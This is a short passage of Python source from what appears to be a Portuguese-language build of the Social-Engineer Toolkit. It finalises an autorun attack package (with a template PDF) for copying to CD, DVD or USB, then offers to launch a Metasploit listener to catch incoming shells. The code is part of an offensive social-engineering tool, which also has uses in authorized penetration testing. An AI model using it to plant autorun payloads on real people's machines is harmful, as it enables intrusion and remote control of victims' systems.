...
core.print_status("Seu ataque foi criado no diretório principal do SET-PT (/root/.set/) na pasta 'autorun'")
core.print_status("Observe que uma cópia de backup do template.pdf também está em /root/.set/template.pdf se necessário.")
core.print_info("Copie o conteúdo da pasta para um CD/DVD/USB para autorun")

# if we want to launch payload and automatically create listener
if trigger in [1, 2, 3]:
    choice1 = core.yesno_prompt("0", "Criar um listener agora [sim|não]")
    if choice1.lower() == "sim" or choice1.lower() == "s":
        ...
        # create the listener
        core.print_status("Iniciando o Metasploit... Isso pode levar algum tempo. Seja paciente! Ou nada de shells para você...")
        subprocess.Popen("{0} -r {1}".format(os.path.join(msf_path, "msfconsole"),
                                           os.path.join(core.userconfigpath, "meta_config")),
                         shell=True).wait()
    else:
        core.print_warning("Cancelando...")
        sleep(2)
